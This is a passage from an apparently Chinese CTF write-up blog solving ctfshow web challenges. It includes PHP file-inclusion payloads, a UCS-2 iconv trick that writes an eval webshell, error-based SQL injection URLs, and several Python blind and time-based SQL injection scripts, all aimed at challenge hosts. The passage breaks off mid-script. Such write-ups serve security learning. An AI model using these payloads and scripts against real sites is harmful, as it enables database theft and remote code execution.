print(res.text)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210816194218880.png" alt="image-20210816194218880"></p>
</blockquote>
<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><blockquote>
<p>分析源码，发现data没过滤，直接伪协议，base64编码shell，payload</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//80accf7c-3e21-4c26-97c4-4a29c404934c.challenge.ctf.show:8080/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZiouKicpPz4</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><blockquote>
<p>通过下载视频，然后010editor可以看到里面有张图，提取出来发现源码是一个文件包含</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210816210245945.png" alt="image-20210816210245945"></p>
<p>虽然过滤了很多，但是file_get_contents是可以直接获取源码的。</p>
<p>payload</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210816201546111.png" alt="image-20210816201546111"></p>
</blockquote>
<h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">$contents=$_POST[<span class="string">'contents'</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">"&lt;?php die();?&gt;"</span>.$contents);</span><br></pre></td></tr></table></figure></div>

<p>还是绕死亡die，这回禁了base64和rot13，可以换其他的方法</p>
<blockquote>
<p>convert.iconv.: 一种过滤器，和使用iconv()函数处理流数据有等同作用</p>
<p><code>iconv ( string $in_charset , string $out_charset , string $str )</code>：将字符串<code>$str</code>从<code>in_charset</code>编码转换到<code>$out_charset</code><br><strong>这里引入ucs-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</strong></p>
<p>查看编码的<a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php" target="_blank" rel="noopener">传送门</a></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$result = iconv(<span class="string">"UCS-2LE"</span>, <span class="string">"UCS-2BE"</span>, <span class="string">'&lt;?php eval($_REQUEST[1])?&gt;'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"第一次反转"</span>.$result;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"第二次反转"</span>.iconv(<span class="string">"UCS-2LE"</span>, <span class="string">"UCS-2BE"</span>, $result);</span><br><span class="line"></span><br><span class="line">输出结果（注意payload得是偶数）</span><br><span class="line">第一次反转?&lt;hp pvela$(R_QEEUTS1[)]&gt;?</span><br><span class="line">第二次反转<span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到，经过两次反转之后代码又组装回来，思路就是用经过一次反转后的webshell和死亡代码<code>&lt;?php die();?&gt;</code>一起组合之后，经过第二次反转我们的webshell就恢复正常了，而死亡代码会被反转打乱不能执行</p>
<p><strong>exp修改一下之前的代码</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># # Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># # Date:2021/8/16</span></span><br><span class="line"><span class="comment"># # blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://387089aa-8506-46c5-a270-0b9298f73b2d.challenge.ctf.show:8080/'</span></span><br><span class="line">payload_get=<span class="string">'php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php'</span></span><br><span class="line"></span><br><span class="line">get_url = url + <span class="string">'?file='</span> + payload_get</span><br><span class="line"></span><br><span class="line">data= &#123;</span><br><span class="line">    <span class="string">'contents'</span>:<span class="string">'?&lt;hp pvela$(R_QEEUTS1[)]&gt;?'</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(get_url,data=data)</span><br><span class="line"></span><br><span class="line">cmd_url = url+<span class="string">'shell.php'</span></span><br><span class="line">data= &#123;</span><br><span class="line">    <span class="string">'1'</span>:<span class="string">'system("cat flag.php");'</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(cmd_url,data=data)</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">    print(<span class="string">"[*]getshell in shell.php"</span>)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-Sqli-Labs wp</title>
    <url>/posts/87.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><h2 id="web517"><a href="#web517" class="headerlink" title="web517"></a>web517</h2><p>查所有数据库ctfshow</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be06e080-6339-4df1-a948-65e99ae476c2.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1)%23</span><br></pre></td></tr></table></figure></div>

<p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be06e080-6339-4df1-a948-65e99ae476c2.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables)),1)%23</span><br></pre></td></tr></table></figure></div>

<p>查字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be06e080-6339-4df1-a948-65e99ae476c2.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;)),1)%23</span><br></pre></td></tr></table></figure></div>

<p>查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be06e080-6339-4df1-a948-65e99ae476c2.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x3d,(select flag from ctfshow.flag)),1)%23</span><br></pre></td></tr></table></figure></div>

<p>右半边flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be06e080-6339-4df1-a948-65e99ae476c2.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x3d,(select right(flag,20) from ctfshow.flag)),1)%23</span><br></pre></td></tr></table></figure></div>

<p>最后flag，删除重复部分</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;f5748827-3058-4686-9127-957897bde966&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="web518"><a href="#web518" class="headerlink" title="web518"></a>web518</h2><p>库ctfshow，表名flagaa字段名flagac</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1  and updatexml(1,concat(0x3d,(select flagac from ctfshow.flagaa)),1)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1  and updatexml(1,concat(0x3d,(select right(flagac,20) from ctfshow.flagaa)),1)</span><br></pre></td></tr></table></figure></div>

<h2 id="web519"><a href="#web519" class="headerlink" title="web519"></a>web519</h2><p>加个括号</p>
<p><strong>查表</strong> flagaanec</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5795e828-f1e9-416c-83b6-fc0609f0dc8e.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39;) and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables)),1)%23</span><br></pre></td></tr></table></figure></div>

<p><strong>查字段</strong> flagaca</p>
<p>查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5795e828-f1e9-416c-83b6-fc0609f0dc8e.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39;) and updatexml(1,concat(0x3d,(select flagaca from ctfshow.flagaanec)),1) --+</span><br></pre></td></tr></table></figure></div>

<p>右半边</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5795e828-f1e9-416c-83b6-fc0609f0dc8e.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39;) and updatexml(1,concat(0x3d,(select right(flagaca,20) from ctfshow.flagaanec)),1) --+</span><br></pre></td></tr></table></figure></div>

<h2 id="web520"><a href="#web520" class="headerlink" title="web520"></a>web520</h2><blockquote>
<p>双引号加)闭合，操作一样，flagsf，</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;460c46d4-97df-421f-9f8c-95d6e335f87b.challenge.ctf.show:8080&#x2F;?id&#x3D;1&quot;) and updatexml(1,concat(0x3d,(select flag23 from ctfshow.flagsf)),1) %23</span><br></pre></td></tr></table></figure></div>

<h2 id="web521"><a href="#web521" class="headerlink" title="web521"></a>web521</h2><blockquote>
<p>开始盲注了，简单写个二分盲注</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://60390dcc-8ebb-4288-97c6-80258e15c409.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagpuck'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag33 from ctfshow.flagpuck"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"?id=1' and if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',1,0)%23"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        res  =  requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! result is &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210810082111885.png" alt="image-20210810082111885"></p>
</blockquote>
<h2 id="web522"><a href="#web522" class="headerlink" title="web522"></a>web522</h2><blockquote>
<p>闭合变双引号了，改改上面的代码</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://5eba9ea8-340b-4668-8e0f-5baf9c16e130.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagpa'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag3a3 from ctfshow.flagpa"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">'?id=1" and if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;"&#123;&#125;",1,0)%23'</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        res  =  requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210810083026663.png" alt="image-20210810083026663"></p>
<h2 id="web523"><a href="#web523" class="headerlink" title="web523"></a>web523</h2><blockquote>
<p><strong>提示说用outfile，但是盲注也可以做，给出两个payload，注意双括号闭合</strong></p>
</blockquote>
<p><strong>直接手注</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;37bffc8b-7509-49ac-8746-d650a9b5de8f.challenge.ctf.show:8080&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(flag43) from ctfshow.flagdk into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;111.txt&quot; %23</span><br></pre></td></tr></table></figure></div>

<p>盲注脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://37bffc8b-7509-49ac-8746-d650a9b5de8f.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagdk'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag43 from ctfshow.flagdk"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"?id=1')) and if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',1,0)%23"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        res  =  requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web524"><a href="#web524" class="headerlink" title="web524"></a>web524</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://056b4af4-c1c0-4199-bd9a-9b7ea826fc1a.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagjugg'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag423 from ctfshow.flagjugg"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"?id=1' and if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',1,0)%23"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        res  =  requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web525"><a href="#web525" class="headerlink" title="web525"></a>web525</h2><blockquote>
<p>时间盲注</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># -- coding:UTF-8 --</span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># Date:2021&#x2F;8&#x2F;10</span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;d5c8f01f-0c15-423a-b2d0-b32f84581a5b.challenge.ctf.show:8080&#x2F;&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line">#--------查库名</span><br><span class="line">#sql&#x3D;&quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line">#--------查表</span><br><span class="line">#sql&#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctfshow&#39;&quot;</span><br><span class="line">#--------查字段</span><br><span class="line">#sql&#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;ctfshow&#39; and table_name&#x3D;&#39;flagug&#39;&quot;</span><br><span class="line">#--------查flag</span><br><span class="line">sql&#x3D; &quot;select flag4a23 from ctfshow.flagug&quot;</span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line">payload &#x3D; &quot;?id&#x3D;1&#39; and if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#39;&#123;&#125;&#39;,sleep(0.6),0) %23&quot;</span><br><span class="line">i &#x3D; 0</span><br><span class="line"></span><br><span class="line">for i in range(1,100):</span><br><span class="line">    head &#x3D; 32</span><br><span class="line">    tail &#x3D; 127</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid &#x3D; (head + tail) &gt;&gt; 1</span><br><span class="line">        url_get &#x3D; url + payload.format(sql,i,mid)</span><br><span class="line">        try:</span><br><span class="line">            res &#x3D; requests.get(url&#x3D;url_get, timeout&#x3D;0.5)</span><br><span class="line">            tail &#x3D; mid</span><br><span class="line">        except:</span><br><span class="line">            head &#x3D; mid + 1</span><br><span class="line">    if head !&#x3D; 32:</span><br><span class="line">        print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(i))</span><br><span class="line">        flag +&#x3D; chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;&#39;.format(flag))</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></div>

<h2 id="web526"><a href="#web526" class="headerlink" title="web526"></a>web526</h2><blockquote>
<p>闭合改成双引号</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://4889f924-f7aa-4338-87ec-d12adb999b0e.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagugs'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flag43s from ctfshow.flagugs"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">'?id=1" and if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;"&#123;&#125;",sleep(0.6),0) %23'</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span 